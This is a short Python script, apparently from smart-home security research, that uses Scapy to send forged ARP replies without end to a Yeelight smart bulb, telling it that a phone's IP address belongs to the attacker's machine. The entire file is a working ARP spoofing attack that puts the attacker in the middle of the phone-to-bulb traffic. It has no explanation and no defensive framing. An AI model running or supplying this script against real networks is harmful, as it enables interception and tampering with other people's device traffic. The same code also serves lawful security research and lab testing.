from scapy.all import *

macAttacker = get_if_hwaddr(conf.iface) #"10:4a:7d:53:88:ba"
ipAttacker = get_if_addr(conf.iface)

ipPhone = "192.168.13.3"

macYeelight = "78:11:dc:aa:53:32"
ipYeelight = "192.168.13.1"

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipPhone
arp[ARP].hwdst = macYeelight
arp[ARP].pdst = ipYeelight

sendp(arp, inter = 20, count=-1, iface=conf.iface)